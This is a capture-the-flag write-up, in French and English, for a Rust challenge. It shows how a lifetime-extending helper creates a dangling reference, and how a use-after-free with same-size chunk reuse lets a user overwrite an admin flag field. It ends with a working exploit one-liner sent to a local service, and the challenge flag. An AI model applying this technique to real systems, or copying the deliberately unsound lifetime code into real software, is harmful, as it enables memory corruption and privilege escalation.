# Unsound Memories

## Write-up (FR)

### Analyse du code

Le code source du challenge est fourni.

La première étape consiste à comprendre comment le flag est protégé.

En examinant la fonction `admin_flag()` :

```rs
pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Error> {
    match self.admins.get_mut(index) {
        Some(Some(admin)) => {
            if admin.is_admin == 1 {
                let flag = std::env::var("FLAG").expect("FLAG not set");
                writeln!(w, "Congratulations! {}", flag)?;
                Ok(())
            } else {
                Err(Error::Deleted)
            }
        }
        ...
    }
}
```

On remarque que le flag est affiché uniquement lorsque :

```rs
admin.is_admin == 1
```

L'objectif devient donc de modifier cette valeur.

### Recherche d'une primitive d'écriture

Les entrées administrateurs peuvent être créées :

```rs
pub fn admin_new(&mut self)
```

et affichées :

```rs
pub fn admin_show(&self)
```

mais aucune fonction ne permet de modifier directement le champ `is_admin`.

Il faut donc trouver une autre fonctionnalité capable d'écrire dans la mémoire d'une entrée administrateur.

Deux fonctions attirent l'attention :

```rs
pub fn log_edit(...)
pub fn ref_edit(...)
```

La seconde est particulièrement intéressante car elle écrit dans des références stockées dans :

```rs
refs: Vec<&'static mut [u8; BUFFER_SIZE]>
```

La question devient alors :

> D'où proviennent ces références ?

### Analyse de alloc_ref()

Les références sont créées par :

```rs
pub fn ref_new(&mut self) -> Result<usize, Error> {
    self.refs.push(alloc_ref());
    Ok(self.refs.len() - 1)
}
```

La fonction utilisée est :

```rs
fn alloc_ref() -> &'static mut [u8; BUFFER_SIZE]
```

Son implémentation :

```rs
fn alloc_ref() -> &'static mut [u8; BUFFER_SIZE] {
    let mut owned = Box::new([0u8; BUFFER_SIZE]);
    cache_ref(owned.as_mut())
}
```

semble suspecte : elle retourne une référence `'static` vers un objet alloué localement.

Normalement cela est impossible sans fuite mémoire volontaire (`Box::leak()`).

### Analyse de cache_ref()

En examinant :

```rs
fn cache_ref<'call, 'extended, T: ?Sized>(
    x: &'call mut T
) -> &'extended mut T
```

on constate qu'une référence avec une durée de vie `'call` est transformée en une référence possédant une durée de vie différente (`'extended`).

Le code exploite un mécanisme subtil de variance des lifetimes afin de convaincre le compilateur qu'une référence courte peut être utilisée comme une référence plus longue.

Le résultat est que :

```rs
alloc_ref()
```

retourne une référence vers un objet qui sera détruit à la fin de la fonction.

À la sortie de `alloc_ref()` :

```text
Box alloué -> Référence retournée -> Box détruit -> Référence toujours conservée
```

La référence stockée dans `refs` devient donc un pointeur suspendu (*dangling pointer*).

Nous avons identifié une vulnérabilité de type Use-After-Free.

### Recherche d'une cible d'exploitation

Maintenant que nous disposons d'une référence vers de la mémoire libérée, il faut trouver quel objet peut réoccuper cette zone mémoire.

L'allocation effectuée dans `alloc_ref()` est :

```rs
Box<[u8; BUFFER_SIZE]>
```

avec :

```rs
BUFFER_SIZE = 144
```

La taille de l'allocation est donc :

```text
144 octets
```

Examinons maintenant la structure administrateur :

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,
    username: [u8; BUFFER_SIZE - 8],
}
```

Sa taille est :

```text
8 + (144 - 8) = 144 octets
```

Les deux objets possèdent exactement la même taille.

Un allocateur mémoire réutilise fréquemment un bloc libéré lorsqu'une nouvelle allocation de taille identique est demandée.

La séquence suivante devient alors très intéressante :

1. Créer une référence (`New ref`)
2. Le buffer est libéré
3. Créer un administrateur (`New admin`)
4. L'administrateur réutilise potentiellement le même bloc mémoire

La référence suspendue pointe alors directement vers l'`AdminRecord`.

### Corruption du champ is_admin

Grâce à :

```rs
#[repr(C)]
```

nous connaissons précisément la disposition mémoire de la structure.

Le premier champ est :

```rs
is_admin: u64
```

situé à l'offset 0.

Écrire les huit premiers octets de l'allocation revient donc à modifier directement :

```rs
admin.is_admin
```

La valeur nécessaire est :

```text
1
```

En little-endian :

```python
struct.pack("<Q", 1)
```

produit :

```text
01 00 00 00 00 00 00 00
```

Après cette écriture :

```rs
admin.is_admin == 1
```

La vérification d'autorisation est satisfaite.

### Compréhension du protocole

Avant d'écrire l'exploit, il faut comprendre comment le programme lit les données.

La fonction :

```rs
fn prompt_bytes(...)
```

demande d'abord une taille :

```text
Enter data (hex):
```

puis lit exactement ce nombre d'octets :

```rs
r.read_exact(&mut buf)?;
```

Le message est trompeur : les données ne sont pas interprétées comme du texte hexadécimal.
Le programme lit directement des octets bruts.

Nous pouvons donc envoyer le résultat de :

```python
struct.pack("<Q", 1)
```

sans aucun encodage supplémentaire.

### Construction de l'exploit

L'exploitation complète est alors :

1. Créer une référence suspendue.
2. Créer un administrateur.
3. Écrire la valeur 1 dans les huit premiers octets de la référence.
4. Vérifier que l'administrateur est maintenant privilégié.
5. Récupérer le flag.

## Write-up (EN)

### Source Code Analysis

The source code is provided.

The first step is to determine how the flag is protected.

Looking at `admin_flag()`:

```rs
pub fn admin_flag<W: Write>(&mut self, index: usize, w: &mut W) -> Result<(), Error> {
    match self.admins.get_mut(index) {
        Some(Some(admin)) => {
            if admin.is_admin == 1 {
                let flag = std::env::var("FLAG").expect("FLAG not set");
                writeln!(w, "Congratulations! {}", flag)?;
                Ok(())
            } else {
                Err(Error::Deleted)
            }
        }
        ...
    }
}
```

we can see that the flag is only revealed when the administrator record has:

```rs
admin.is_admin == 1
```

Our objective therefore becomes modifying this value.

### Looking for a Write Primitive

Administrator records can be created and displayed, but there is no legitimate way to modify `is_admin`.

We therefore need another functionality capable of writing into an administrator object.

The interesting candidates are:

```rs
pub fn log_edit(...)
pub fn ref_edit(...)
```

`ref_edit()` writes into objects stored in:

```rs
Vec<&'static mut [u8; BUFFER_SIZE]>
```

This raises an important question:

> Where do these references come from?

### Investigating alloc_ref()

References are created through:

```rs
alloc_ref()
```

which returns:

```rs
&'static mut [u8; BUFFER_SIZE]
```

Internally it performs:

```rs
let mut owned = Box::new([0u8; BUFFER_SIZE]);
cache_ref(owned.as_mut())
```

Returning a `'static` reference to a locally allocated object is highly suspicious.

Normally this would require a deliberate memory leak.

### Investigating cache_ref()

The function:

```rs
fn cache_ref<'call, 'extended, T: ?Sized>(
    x: &'call mut T
) -> &'extended mut T
```

artificially transforms one lifetime into another.

This lifetime trick convinces the compiler that a short-lived reference can outlive the object it points to.

As a consequence:

```rs
alloc_ref()
```

returns a reference to memory that will be freed immediately afterwards.

The stored reference becomes a dangling pointer.

We have identified a Use-After-Free vulnerability.

### Finding an Exploitation Target

The freed allocation created by `alloc_ref()` is:

```rs
Box<[u8; BUFFER_SIZE]>
```

with:

```rs
BUFFER_SIZE = 144
```

Therefore the allocation size is:

```text
144 bytes
```

Now consider:

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,
    username: [u8; BUFFER_SIZE - 8],
}
```

Its size is:

```text
8 + (144 - 8) = 144 bytes
```

Both allocations have exactly the same size.

This means the allocator is very likely to recycle the freed chunk when a new administrator record is allocated.

The dangling reference can therefore end up pointing directly at an `AdminRecord`.

### Overwriting is_admin

Because the structure uses:

```rs
#[repr(C)]
```

its layout is predictable.

The first field is:

```rs
is_admin: u64
```

located at offset zero.

Writing to the first eight bytes of the dangling reference directly modifies:

```rs
admin.is_admin
```

The required value is:

```text
1
```

which can be generated using:

```python
struct.pack("<Q", 1)
```

After the overwrite:

```rs
admin.is_admin == 1
```

and the privilege check succeeds.

### Understanding the Protocol

Before writing an exploit, we need to understand how user input is parsed.

The function:

```rs
prompt_bytes(...)
```

first reads a size and then reads exactly that many raw bytes:

```rs
r.read_exact(&mut buf)?;
```

Despite the prompt saying:

```text
Enter data (hex):
```

the input is not interpreted as hexadecimal text.

Raw binary bytes can therefore be sent directly.

### Building the Exploit

The final exploit performs the following actions:

1. Create a dangling reference.
2. Allocate an administrator record.
3. Overwrite the first eight bytes with the value 1.
4. Verify administrator privileges.
5. Retrieve the flag.

## Exploit

```python
python3 -c "
import sys
import struct

sys.stdout.buffer.write(b'5\n')
sys.stdout.buffer.write(b'8\n')

sys.stdout.buffer.write(b'7\n0\n8\n')
sys.stdout.buffer.write(struct.pack('<Q', 1))
sys.stdout.buffer.write(b'\n')

sys.stdout.buffer.write(b'9\n0\n')
sys.stdout.buffer.write(b'11\n0\n')
sys.stdout.buffer.write(b'0\n')
" | nc localhost 1337
```

## Flag

`DCI{N4n0L0g_Adm1n_Byp4ss_9a6295810c1b}`
